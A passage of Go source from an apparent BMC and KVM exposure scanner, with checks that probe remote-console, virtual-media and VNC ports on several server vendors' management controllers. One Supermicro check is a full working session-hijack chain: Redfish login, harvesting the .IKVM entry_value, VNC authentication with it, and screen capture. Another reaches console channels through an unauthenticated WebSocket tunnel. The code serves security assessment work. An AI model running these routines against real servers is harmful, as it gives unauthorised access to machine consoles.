package check

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"net"
	"net/http"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/crypto/tls"
	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
)

func init() {
	Register(Check{
		Name:        "kvm.avocent.aps",
		Description: "Avocent APS KVM console reachable (TCP/3900)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMAvocentAPS,
	})
	Register(Check{
		Name:        "kvm.ami.redirect",
		Description: "AMI KVM redirection service reachable (TCP/7578)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMAMIRedirect,
	})
	Register(Check{
		Name:        "kvm.ami.vmedia",
		Description: "AMI virtual-media daemons reachable (TCP/5120-5123)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMAMIVMedia,
	})
	Register(Check{
		Name:        "kvm.hpe.irc",
		Description: "HPE iLO integrated remote console reachable (TCP/17988/17990)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMHPEIRC,
	})
	Register(Check{
		Name:        "kvm.cisco.vkvm",
		Description: "Cisco CIMC vKVM console reachable (TCP/2068)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMCiscoVKVM,
	})
	Register(Check{
		Name:        "kvm.usbAnywhere",
		Description: "USBAnywhere / KVM-side redirection channel reachable (TCP/623)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMUSBAnywhere,
	})
	Register(Check{
		Name:        "kvm.smc.vmedia",
		Description: "SMC/ATEN virtual-media USB-over-IP slot probe (TCP/623)",
		Category:    "exposure",
		Applies:     Applicability{Vendors: []string{"supermicro"}},
		Enabled:     true,
		Run:         runKVMSMCVMedia,
	})
	Register(Check{
		Name:        "kvm.smc.ws.bypass",
		Description: "SMC/ATEN lighttpd wstunnel bypasses Redfish auth for ikvmserver (443/wss -> KVM:63630 + VM:63631)",
		Category:    "exposure",
		Applies:     Applicability{Vendors: []string{"supermicro"}},
		Enabled:     true,
		Run:         runKVMSMCWSBypass,
	})
	Register(Check{
		Name:          "kvm.smc.ikvm.sessionHijack",
		Description:   "SMC iKVM: with any valid credential, confirm console access via unauthenticated .IKVM page + capture screenshot",
		Category:      "exposure",
		Applies:       Applicability{Vendors: []string{"supermicro"}},
		Authenticated: true,
		Enabled:       true,
		Run:           runKVMSMCIKVMSessionHijack,
	})
	Register(Check{
		Name:        "kvm.vnc",
		Description: "Standalone VNC/RFB console fingerprint (5900/5901)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMStandaloneVNC,
	})
}

type kvmChannelState struct {
	open         bool
	proto        string
	cn           string
	tlsVersion   string
	alpn         string
	handshakeHex string
	tlsOutcome   string
}

func kvmDialOpen(host string, port int, to time.Duration) (bool, []byte) {
	if to <= 0 {
		to = 3 * time.Second
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), to)
	if err != nil {
		return false, nil
	}
	defer conn.Close()
	_ = conn.SetReadDeadline(time.Now().Add(min(to, 500*time.Millisecond)))
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n > 0 {
		return true, append([]byte(nil), buf[:n]...)
	}
	return true, nil
}

func kvmTLSProbe(host string, port int, to time.Duration) (ok bool, cn, version, alpn, outcome string, banner []byte) {
	if to <= 0 {
		to = 3 * time.Second
	}
	d := &net.Dialer{Timeout: to}
	conn, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)), &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return false, "", "", "", tlsProbeOutcome(err), nil
	}
	defer conn.Close()
	cs := conn.ConnectionState()
	if len(cs.PeerCertificates) > 0 {
		cn = cs.PeerCertificates[0].Subject.CommonName
	}
	version = tlsVersionString(cs.Version)
	alpn = cs.NegotiatedProtocol
	_ = conn.SetReadDeadline(time.Now().Add(min(to, 500*time.Millisecond)))
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n > 0 {
		banner = append([]byte(nil), buf[:n]...)
	}
	return true, cn, version, alpn, tlsProbeOutcome(nil), banner
}

func tlsProbeOutcome(err error) string {
	if err == nil {
		return "negotiated"
	}
	var rhe tls.RecordHeaderError
	if errors.As(err, &rhe) {
		return "not-tls"
	}
	var alert tls.AlertError
	if errors.As(err, &alert) {
		return "alert-" + strconv.Itoa(int(alert))
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "no-reply"
	}
	if errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF) {
		return "closed"
	}
	switch msg := err.Error(); {
	case strings.Contains(msg, "remote error"):
		return "alert"
	case strings.Contains(msg, "reset by peer"):
		return "reset"
	}
	return "rejected"
}

func tlsVersionString(v uint16) string {
	switch v {
	case tls.VersionTLS10:
		return "TLS1.0"
	case tls.VersionTLS11:
		return "TLS1.1"
	case tls.VersionTLS12:
		return "TLS1.2"
	case tls.VersionTLS13:
		return "TLS1.3"
	case tls.VersionSSL30:
		return "SSL3.0"
	default:
		return fmt.Sprintf("0x%04x", v)
	}
}

func probeKVMChannel(host string, port int, to time.Duration) kvmChannelState {
	ok, cn, ver, alpn, outcome, banner := kvmTLSProbe(host, port, to)
	if ok {
		hh := ""
		if len(banner) > 0 {
			hh = hex.EncodeToString(banner)
		}
		return kvmChannelState{open: true, proto: "tls", cn: cn, tlsVersion: ver, alpn: alpn, handshakeHex: hh, tlsOutcome: outcome}
	}

	if ok, banner := kvmDialOpen(host, port, to); ok {
		hh := ""
		if len(banner) > 0 {
			hh = hex.EncodeToString(banner)
		}
		return kvmChannelState{open: true, proto: "tcp", handshakeHex: hh, tlsOutcome: outcome}
	}
	return kvmChannelState{}
}

func kvmVendorOr(t *engine.Target, fallback string) string {
	if v := identityVendor(t); v != "" {
		return v
	}
	return fallback
}

func runKVMAvocentAPS(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 3900, t.Timeout)
	if !st.open {
		return nil
	}
	return []engine.Finding{{
		Check:     "kvm.avocent.aps",
		Category:  "exposure",
		Risk:      "info",
		Port:      3900,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    kvmFieldsFrom("avocent", kvmVendorOr(t, "avocent"), 3900, st),
	}}
}

func runKVMAMIRedirect(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 7578, t.Timeout)
	if !st.open {
		return nil
	}
	return []engine.Finding{{
		Check:     "kvm.ami.redirect",
		Category:  "exposure",
		Risk:      "info",
		Port:      7578,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    kvmFieldsFrom("ami-redirect", kvmVendorOr(t, "ami"), 7578, st),
	}}
}

func runKVMAMIVMedia(ctx context.Context, t *engine.Target) []engine.Finding {
	var openPorts []string
	first, enc := 0, ""
	var proofState kvmChannelState
	for _, p := range []int{5120, 5122, 5123} {
		if st := probeKVMChannel(t.Host, p, t.Timeout); st.open {
			openPorts = append(openPorts, strconv.Itoa(p))
			if first == 0 {
				first, enc, proofState = p, st.proto, st
			}
		}
	}
	if len(openPorts) == 0 {
		return nil
	}
	fields := kvmFieldsFrom("ami-vmedia", kvmVendorOr(t, "ami"), first, proofState)

	fields = append(fields,
		engine.Field{Key: "ports", Val: strings.Join(openPorts, ",")},
		engine.Field{Key: "encryption", Val: enc},
	)
	return []engine.Finding{{
		Check:     "kvm.ami.vmedia",
		Category:  "exposure",
		Risk:      "info",
		Port:      first,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    fields,
	}}
}

func runKVMHPEIRC(ctx context.Context, t *engine.Target) []engine.Finding {
	for _, p := range []int{17990, 17988} {
		if st := probeKVMChannel(t.Host, p, t.Timeout); st.open {
			fields := kvmFieldsFrom("hpe-irc", kvmVendorOr(t, "hpe"), p, st)

			if p == 17990 {
				fields = append(fields,
					engine.Field{Key: "channelDetail", Val: "remote-console + virtual-media"},
					engine.Field{Key: "virtualMedia", Val: "true"})
			} else {
				fields = append(fields, engine.Field{Key: "channelDetail", Val: "legacy-remote-console"})
			}
			return []engine.Finding{{
				Check:     "kvm.hpe.irc",
				Category:  "exposure",
				Risk:      "info",
				Port:      p,
				Transport: "tcp",
				Protocol:  "tcp",
				Fields:    fields,
			}}
		}
	}
	return nil
}

func runKVMCiscoVKVM(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 2068, t.Timeout)
	if !st.open {
		return nil
	}
	return []engine.Finding{{
		Check:     "kvm.cisco.vkvm",
		Category:  "exposure",
		Risk:      "info",
		Port:      2068,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    kvmFieldsFrom("cisco-vkvm", kvmVendorOr(t, "cisco"), 2068, st),
	}}
}

func runKVMSMCIKVMSessionHijack(ctx context.Context, t *engine.Target) []engine.Finding {
	creds := targetCreds(t)
	if len(creds) == 0 {
		return nil
	}
	cred := creds[0]
	if cred.User == "" {
		return nil
	}

	to := t.Timeout
	if to <= 0 {
		to = 5 * time.Second
	}

	hc := httpx.Client(to)
	base := "https://" + netaddr.URLAuthority(t.Host)

	sessURL := base + "/redfish/v1/SessionService/Sessions"
	body, _ := json.Marshal(map[string]string{"UserName": cred.User, "Password": cred.Pass})
	req, _ := http.NewRequestWithContext(ctx, "POST", sessURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := hc.Do(req)
	if err != nil {
		return nil
	}
	token := resp.Header.Get("X-Auth-Token")
	status := resp.StatusCode
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 8192))
	_ = resp.Body.Close()
	if token == "" || status != http.StatusCreated {
		return nil
	}

	oem := base + "/redfish/v1/Managers/1/Oem/Supermicro/IKVM"
	req2, _ := http.NewRequestWithContext(ctx, "GET", oem, nil)
	req2.Header.Set("X-Auth-Token", token)
	resp2, err := hc.Do(req2)
	if err != nil {
		return nil
	}
	if resp2.StatusCode != http.StatusOK {
		_, _ = io.Copy(io.Discard, io.LimitReader(resp2.Body, 8192))
		_ = resp2.Body.Close()
		return nil
	}
	oemBody := httpx.ReadBody(resp2.Body, 4096)
	_ = resp2.Body.Close()

	var oemJSON struct {
		URI string `json:"URI"`
	}
	if err := json.Unmarshal(oemBody, &oemJSON); err != nil || oemJSON.URI == "" {
		return nil
	}

	ikvmURI := oemJSON.URI
	uidRe := regexp.MustCompile(`/redfish/([A-Za-z0-9_-]{5,30})\.IKVM`)
	m := uidRe.FindStringSubmatch(ikvmURI)
	if m == nil {
		return nil
	}
	uid := m[1]

	ikvmURL := base + ikvmURI
	req3, _ := http.NewRequestWithContext(ctx, "GET", ikvmURL, nil)

	resp3, err := hc.Do(req3)
	if err != nil {
		return nil
	}
	if resp3.StatusCode != http.StatusOK {
		_, _ = io.Copy(io.Discard, io.LimitReader(resp3.Body, 8192))
		_ = resp3.Body.Close()
		return nil
	}
	pageBody := httpx.ReadBody(resp3.Body, 65536)
	_ = resp3.Body.Close()

	evRe := regexp.MustCompile(`entry_value[^>]*value="([^"]+)"`)
	em := evRe.Find(pageBody)
	if em == nil {
		return nil
	}
	evMatch := evRe.FindSubmatch(pageBody)
	if evMatch == nil {
		return nil
	}
	entryValue := string(evMatch[1])

	var authPay [49]byte
	ev := []byte(entryValue)
	for i := range 24 {
		if i < len(ev) {
			authPay[i] = ev[i]
		}
	}

	vc := ikvmDial(t.Host, 5900, to)
	if vc == nil {
		return []engine.Finding{ikvmHijackUnreachableFinding(uid, entryValue, ikvmURL)}
	}
	defer vc.Close()

	width, height, serverName, authOK := ikvmAuthAndInit(vc, authPay[:], to)

	if !authOK {
		return []engine.Finding{{
			Check: "kvm.smc.ikvm.sessionHijack", Category: "exposure", Risk: "info",
			Port: 443, Transport: "tcp", Protocol: "https",
			Fields: engine.F(
				"uid", uid,
				"entryValue", entryValue,
				"ikvmURL", ikvmURL,
				"serverName", serverName,
				"proof", proofKV("path", ikvmURL, "entryValue", entryValue, "vncAuth", "failed", "serverName", serverName),
			),
		}}
	}

	screenshot := ikvmScreenshot(vc, width, height, to)
	proofStr := proofKV(
		"path", ikvmURL,
		"entryValue", entryValue,
		"vncAuth", "ok",
		"serverName", serverName,
		"width", strconv.Itoa(width),
		"height", strconv.Itoa(height))
	fields := engine.F(
		"uid", uid,
		"entryValue", entryValue,
		"ikvmURL", ikvmURL,
		"serverName", serverName,
		"width", strconv.Itoa(width),
		"height", strconv.Itoa(height),
		"proof", proofStr,
	)
	if screenshot != "" {
		fields = append(fields, engine.Field{Key: "screenshot_png_b64", Val: screenshot})
	}
	return []engine.Finding{{
		Check: "kvm.smc.ikvm.sessionHijack", Category: "exposure", Risk: "info",
		Port: 443, Transport: "tcp", Protocol: "vnc",
		Fields: fields,
	}}
}

func ikvmHijackUnreachableFinding(uid, entryValue, ikvmURL string) engine.Finding {
	return engine.Finding{
		Check: "kvm.smc.ikvm.sessionHijack", Category: "creds", Risk: "high",
		Port: 443, Transport: "tcp", Protocol: "https",
		Fields: engine.F(
			"uid", uid,
			"entryValue", entryValue,
			"ikvmURL", ikvmURL,
			"vncReachable", "false",
			"proof", proofKV("path", ikvmURL, "uid", uid, "entryValue", entryValue, "vncTLS", "failed"),
		),
	}
}

func ikvmScreenshot(conn net.Conn, width, height int, to time.Duration) string {
	if width <= 0 || height <= 0 || width*height*4 > 8<<20 {
		return ""
	}
	vc := &vncConn{c: conn, to: min(to, 10*time.Second)}

	setEnc := make([]byte, 8)
	setEnc[0] = 0x02
	binary.BigEndian.PutUint16(setEnc[2:4], 1)

	if !vc.write(setEnc) {
		return ""
	}

	fbReq := make([]byte, 10)
	fbReq[0] = 0x03

	binary.BigEndian.PutUint16(fbReq[6:8], uint16(width))
	binary.BigEndian.PutUint16(fbReq[8:10], uint16(height))
	if !vc.write(fbReq) {
		return ""
	}

	hdr, ok := vc.read(4)
	if !ok || hdr[0] != 0x00 {
		return ""
	}
	numRects := int(binary.BigEndian.Uint16(hdr[2:4]))
	img := image.NewRGBA(image.Rect(0, 0, width, height))

	for range numRects {

		rh, ok := vc.read(12)
		if !ok {
			break
		}
		rx := int(binary.BigEndian.Uint16(rh[0:2]))
		ry := int(binary.BigEndian.Uint16(rh[2:4]))
		rw := int(binary.BigEndian.Uint16(rh[4:6]))
		rht := int(binary.BigEndian.Uint16(rh[6:8]))
		enc := int32(binary.BigEndian.Uint32(rh[8:12]))

		if enc != 0 || rw <= 0 || rht <= 0 {
			continue
		}

		if rw*rht*4 > 8<<20 {
			break
		}
		pix, ok := vc.read(rw * rht * 4)
		if !ok {
			break
		}
		for py := range rht {
			for px := range rw {
				off := (py*rw + px) * 4

				img.SetRGBA(rx+px, ry+py, color.RGBA{
					R: pix[off+2], G: pix[off+1], B: pix[off], A: 0xFF,
				})
			}
		}
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func ikvmDial(host string, port int, to time.Duration) net.Conn {

	if ws := ikvmWSConnect(host, 443, "/", to); ws != nil {
		return ws
	}

	d := &net.Dialer{Timeout: to}
	tc, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)),
		&tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return nil
	}
	return tc
}

func ikvmWSConnect(host string, port int, path string, to time.Duration) net.Conn {
	d := &net.Dialer{Timeout: to}
	tc, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)),
		&tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return nil
	}

	keyBytes := make([]byte, 16)
	if _, err := rand.Read(keyBytes); err != nil {
		tc.Close()
		return nil
	}
	wsKey := base64.StdEncoding.EncodeToString(keyBytes)

	upgrade := fmt.Sprintf(
		"GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"+
			"Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
		path, host, wsKey)

	tc.SetDeadline(time.Now().Add(to))
	if _, err := tc.Write([]byte(upgrade)); err != nil {
		tc.Close()
		return nil
	}

	var httpResp []byte
	oneByte := make([]byte, 1)
	for !bytes.Contains(httpResp, []byte("\r\n\r\n")) {
		n, err := tc.Read(oneByte)
		if n > 0 {
			httpResp = append(httpResp, oneByte[:n]...)
		}
		if err != nil || len(httpResp) > 4096 {
			break
		}
	}
	if !strings.Contains(string(httpResp), "101 Switching Protocols") {
		tc.Close()
		return nil
	}

	return &wsConn{conn: tc}
}

type wsConn struct {
	conn    net.Conn
	readBuf []byte
}

func (w *wsConn) Read(p []byte) (int, error) {

	if len(w.readBuf) > 0 {
		n := copy(p, w.readBuf)
		w.readBuf = w.readBuf[n:]
		return n, nil
	}

	hdr := make([]byte, 2)
	if _, err := io.ReadFull(w.conn, hdr); err != nil {
		return 0, err
	}
	payLen := int(hdr[1] & 0x7F)
	if payLen == 126 {
		ext := make([]byte, 2)
		if _, err := io.ReadFull(w.conn, ext); err != nil {
			return 0, err
		}
		payLen = int(binary.BigEndian.Uint16(ext))
	} else if payLen == 127 {
		ext := make([]byte, 8)
		if _, err := io.ReadFull(w.conn, ext); err != nil {
			return 0, err
		}
		payLen = int(binary.BigEndian.Uint64(ext))
	}

	const maxWSFrame = 1 << 20
	if payLen < 0 || payLen > maxWSFrame {
		return 0, fmt.Errorf("ws frame length %d out of range (max %d)", payLen, maxWSFrame)
	}

	payload := make([]byte, payLen)
	if _, err := io.ReadFull(w.conn, payload); err != nil {
		return 0, err
	}

	n := copy(p, payload)
	if n < payLen {
		w.readBuf = append(w.readBuf, payload[n:]...)
	}
	return n, nil
}

func (w *wsConn) Write(p []byte) (int, error) {

	mask := make([]byte, 4)
	if _, err := rand.Read(mask); err != nil {
		return 0, err
	}
	n := len(p)
	var hdr []byte
	if n <= 125 {
		hdr = []byte{0x82, byte(0x80 | n)}
	} else if n <= 65535 {
		hdr = []byte{0x82, 0xFE, byte(n >> 8), byte(n)}
	} else {
		hdr = []byte{0x82, 0xFF, 0, 0, 0, 0, byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
	}
	hdr = append(hdr, mask...)
	masked := make([]byte, n)
	for i, b := range p {
		masked[i] = b ^ mask[i%4]
	}
	frame := append(hdr, masked...)
	if _, err := w.conn.Write(frame); err != nil {
		return 0, err
	}
	return n, nil
}

func (w *wsConn) Close() error                       { return w.conn.Close() }
func (w *wsConn) LocalAddr() net.Addr                { return w.conn.LocalAddr() }
func (w *wsConn) RemoteAddr() net.Addr               { return w.conn.RemoteAddr() }
func (w *wsConn) SetDeadline(t time.Time) error      { return w.conn.SetDeadline(t) }
func (w *wsConn) SetReadDeadline(t time.Time) error  { return w.conn.SetReadDeadline(t) }
func (w *wsConn) SetWriteDeadline(t time.Time) error { return w.conn.SetWriteDeadline(t) }

func runKVMSMCWSBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	to := t.Timeout
	if to <= 0 {
		to = 5 * time.Second
	}

	var findings []engine.Finding

	if kvmWS := ikvmWSConnect(t.Host, 443, "/", to); kvmWS != nil {
		vc := &vncConn{c: kvmWS, to: min(to, 2*time.Second)}
		banner, ok := vc.read(12)
		kvmWS.Close()
		ver := ""
		if ok && strings.HasPrefix(string(banner), "RFB ") {
			ver = parseRFBVersion(banner)
		}
		bannerBytes := 0
		if ok {
			bannerBytes = len(banner)
		}
		findings = append(findings, smcWSKVMFinding(kvmVendorOr(t, "supermicro"), ver, bannerBytes))
	}

	if vmWS := ikvmWSConnect(t.Host, 443, "/vm", to); vmWS != nil {
		wsvc := &vncConn{c: vmWS, to: to}

		req := []byte{0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00}
		wsvc.write(req)
		hdr, ok := wsvc.read(8)
		if ok && hdr[3] == 0x09 {
			payLen := int(binary.LittleEndian.Uint32(hdr[4:8]))

			slotStatus := ""
			if payLen > 0 && payLen <= 64 {
				if pay, okp := wsvc.read(payLen); okp && len(pay) >= 1 {
					slotStatus = fmt.Sprintf("slots=%d perSlot=%s", pay[0], hex.EncodeToString(pay[1:]))
				}
			}
			vmWS.Close()
			findings = append(findings, smcWSVMediaFinding(kvmVendorOr(t, "supermicro"), payLen, slotStatus))
		} else {
			vmWS.Close()
		}
	}

	return findings
}

func smcWSKVMFinding(vendor, rfbVersion string, bannerBytes int) engine.Finding {
	fields := engine.F(
		"vendor", vendor,
		"tunnel", "wss://host/ -> ikvmserver:63630 (KVM)",
		"httpAuth", "not-applied",
		"residualAuth", "ikvmserver RFB auth still required",
		"bannerBytes", strconv.Itoa(bannerBytes),
	)
	if rfbVersion != "" {
		fields = append(fields, engine.Field{Key: "rfbVersion", Val: rfbVersion})
	}
	fields = append(fields, engine.ProofUnavailable("rfb greeting is fixed per firmware line"))
	return engine.Finding{
		Check: "kvm.smc.ws.bypass", Category: "exposure", Risk: "info",
		Port: 443, Transport: "tcp", Protocol: "wss",
		Fields: fields,
	}
}

func smcWSVMediaFinding(vendor string, payLen int, slotStatus string) engine.Finding {
	fields := engine.F(
		"vendor", vendor,
		"tunnel", "wss://host/vm -> ikvmserver:63631 (VM)",
		"vmProbe", fmt.Sprintf("GET_DEV_STATUS reply opcode=0x09 payLen=%d", payLen),
		"httpAuth", "not-applied",
		"residualAuth", "ikvmserver VM HMAC auth still required for media ops",
	)
	if slotStatus == "" {
		fields = append(fields, engine.ProofUnavailable("status reply carried no slot payload"))
	} else {
		fields = append(fields,
			engine.Field{Key: "slotStatus", Val: slotStatus},
			engine.Field{Key: "proof", Val: proofKV("tunnel", "wss-vm", "payLen", strconv.Itoa(payLen), "slotStatus", slotStatus)},
		)
	}
	return engine.Finding{
		Check: "kvm.smc.ws.bypass", Category: "exposure", Risk: "info",
		Port: 443, Transport: "tcp", Protocol: "wss",
		Fields: fields,
	}
}

func ikvmAuthAndInit(conn net.Conn, authPay []byte, to time.Duration) (width, height int, serverName string, ok bool) {
	vc := &vncConn{c: conn, to: to}

	banner, good := vc.read(12)
	if !good || !strings.HasPrefix(string(banner), "RFB ") {
		return
	}
	if !vc.write(banner) {
		return
	}

	countB, good := vc.read(1)
	if !good || countB[0] == 0 {
		return
	}
	types, good := vc.read(int(countB[0]))
	if !good || !slices.Contains(types, byte(0x10)) {
		return
	}

	if !vc.write([]byte{0x10}) {
		return
	}
	if _, good = vc.read(24); !good {
		return
	}
	if !vc.write(authPay) {
		return
	}

	result, good := vc.read(4)
	if !good || result[0] != 0 || result[1] != 0 || result[2] != 0 || result[3] != 0 {
		return
	}
	ok = true

	if !vc.write([]byte{0x01}) {
		return
	}

	si, good := vc.read(24)
	if !good {
		return
	}
	width = int(binary.BigEndian.Uint16(si[0:2]))
	height = int(binary.BigEndian.Uint16(si[2:4]))
	nameLen := int(binary.BigEndian.Uint32(si[20:24]))
	if nameLen > 0 && nameLen < 256 {
		name, good := vc.read(nameLen)
		if good {
			serverName = string(name)
		}
	}
	return
}

func usbAnywhereLooksLikeATEN(st kvmChannelState) bool {
	if !st.open {
		return false
	}
	if st.proto == "tls" {

		return true
	}

	return st.handshakeHex == ""
}

func runKVMUSBAnywhere(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 623, t.Timeout)
	if !st.open {
		return nil
	}

	if !usbAnywhereLooksLikeATEN(st) {
		return nil
	}
	fields := kvmFieldsFrom("usbanywhere", kvmVendorOr(t, "supermicro"), 623, st)
	return []engine.Finding{{
		Check:     "kvm.usbAnywhere",
		Category:  "exposure",
		Risk:      "info",
		Port:      623,
		Transport: "tcp",
		Protocol:  "aten-vmedia",
		Fields:    fields,
	}}
}

func runKVMSMCVMedia(ctx context.Context, t *engine.Target) []engine.Finding {
	res := probeATENVMedia(t.Host, 623, t.Timeout)
	if res == nil {
		return nil
	}
	return []engine.Finding{smcVMediaFinding(t, res)}
}

func smcVMediaFinding(t *engine.Target, res *vmediaResult) engine.Finding {
	platform := ""
	if res.platformID != 0 {
		platform = strconv.Itoa(res.platformID)
	}
	fields := engine.F(
		"vendor", kvmVendorOr(t, "supermicro"),
		"channel", "aten-vmedia",
		"slots", strconv.Itoa(res.slotCount),
		"slotStatus", res.slotSummary,
		"proof", proofKV("channel", "aten-vmedia", "slots", strconv.Itoa(res.slotCount), "slotStatus", res.slotSummary, "platformId", platform),
	)
	if platform != "" {
		fields = append(fields, engine.Field{Key: "platformId", Val: platform})
	}
	return engine.Finding{
		Check:     "kvm.smc.vmedia",
		Category:  "exposure",
		Risk:      "info",
		Port:      623,
		Transport: "tcp",
		Protocol:  "aten-vmedia",
		Fields:    fields,
	}
}

type vmediaResult struct {
	slotCount   int
	slotSummary string
	platformID  int
}

func probeATENVMedia(host string, port int, to time.Duration) *vmediaResult {
	if to <= 0 {
		to = 5 * time.Second
	}

	dialVM := func() (net.Conn, bool) {
		d := &net.Dialer{Timeout: to}
		if tc, terr := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)),
			&tls.Config{InsecureSkipVerify: true}); terr == nil {
			return tc, true
		}
		c, cerr := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), to)
		if cerr != nil {
			return nil, false
		}
		return c, true
	}

	vmSend := func(opcode byte) []byte {
		conn, ok := dialVM()
		if !ok {
			return nil
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(to))
		req := []byte{0x00, 0x00, 0x00, opcode, 0x00, 0x00, 0x00, 0x00}
		if _, err := conn.Write(req); err != nil {
			return nil
		}
		var hdr [8]byte
		if _, err := io.ReadFull(conn, hdr[:]); err != nil {
			return nil
		}
		payLen := binary.LittleEndian.Uint32(hdr[4:8])
		if payLen == 0 || payLen > 64 {
			return nil
		}
		payload := make([]byte, payLen)
		if _, err := io.ReadFull(conn, payload); err != nil {
			return nil
		}
		return payload
	}

	gdsPayload := vmSend(0x08)
	if len(gdsPayload) < 1 {
		return nil
	}
	slotCount := int(gdsPayload[0])
	statusNames := map[byte]string{0xFF: "unused", 0x00: "no-media"}
	parts := make([]string, 0, slotCount)
	for i := 1; i < len(gdsPayload) && i <= slotCount; i++ {
		s := gdsPayload[i]
		if n, ok := statusNames[s]; ok {
			parts = append(parts, n)
		} else {
			parts = append(parts, fmt.Sprintf("media-0x%02x", s))
		}
	}
	res := &vmediaResult{
		slotCount:   slotCount,
		slotSummary: strings.Join(parts, ","),
	}

	if pip := vmSend(0x0A); len(pip) >= 1 {
		res.platformID = int(pip[0])
	}

	return res
}

func kvmFieldsFrom(channel, vendor string, port int, st kvmChannelState) []engine.Field {
	fields := engine.F(
		"vendor", vendor,
		"channel", channel,
		"encryption", st.proto,
	)
	if st.cn != "" {
		fields = append(fields, engine.Field{Key: "cn", Val: st.cn})
	}
	if st.tlsVersion != "" {
		fields = append(fields, engine.Field{Key: "tlsVersion", Val: st.tlsVersion})
	}
	if st.alpn != "" {
		fields = append(fields, engine.Field{Key: "tlsAlpn", Val: st.alpn})
	}
	if st.handshakeHex != "" {
		fields = append(fields, engine.Field{Key: "raw", Val: st.handshakeHex})
	}
	if !kvmChannelSpoke(st) {
		reason := kvmChannelMute[channel]
		if reason == "" {
			reason = "listener sent nothing before the read deadline"
		}
		if st.tlsOutcome != "" {
			fields = append(fields, engine.Field{Key: "tlsHandshake", Val: st.tlsOutcome})
		}
		return append(fields, engine.ProofUnavailable(reason))
	}
	return append(fields, engine.Field{Key: "proof", Val: kvmChannelProof(channel, port, st)})
}

var kvmChannelMute = map[string]string{
	"usbanywhere": "aten vmedia listener is mute behind stunnel",
}

func kvmChannelSpoke(st kvmChannelState) bool {
	return st.cn != "" || st.tlsVersion != "" || st.alpn != "" || st.handshakeHex != ""
}

func kvmChannelProof(channel string, port int, st kvmChannelState) string {
	kv := []string{
		"channel", channel,
		"tcpPort", strconv.Itoa(port),
		"transport", st.proto,
		"commonName", st.cn,
		"tlsVersion", st.tlsVersion,
		"tlsAlpn", st.alpn,
		"tlsHandshake", st.tlsOutcome,
	}
	if n := len(st.handshakeHex) / 2; n > 0 {
		kv = append(kv, "serverBytes", strconv.Itoa(n))
	}
	return proofKV(kv...)
}

func runKVMStandaloneVNC(ctx context.Context, t *engine.Target) []engine.Finding {
	vendor := identityVendor(t)
	for _, p := range []int{5900, 5901} {
		info := probeVNC(t.Host, p, t.Timeout, !t.DisableLogins, vendor)
		if info == nil {
			continue
		}
		return []engine.Finding{vncConsoleFinding(t, p, info)}
	}
	return nil
}

func vncConsoleFinding(t *engine.Target, p int, info *vncInfo) engine.Finding {
	enc := "none"
	if info.tls {
		enc = "tls"
	}
	fv := kvmVendorOr(t, "")
	base := []string{
		"vendor", fv,
		"version", info.version,
		"encryption", enc,
		"auth", info.auth,
		"secTypes", info.secTypes,
		"cn", info.cn,
	}
	if info.org != "" {
		base = append(base, "certOrg", info.org)

		for _, f := range vendorSlugField(info.org) {
			base = append(base, f.Key, f.Val)
		}
	}

	if fv == "dell" || strings.Contains(strings.ToLower(info.cn), "idrac") {
		base = append(base, "product", "iDRAC (AVOCENT avct KVM)", "kvmEndpoint", "wss://<host>/vkvm/")
	}
	if info.insydeChallenge != nil {
		allZero := true
		for _, b := range info.insydeChallenge {
			if b != 0 {
				allZero = false
				break
			}
		}
		if allZero {
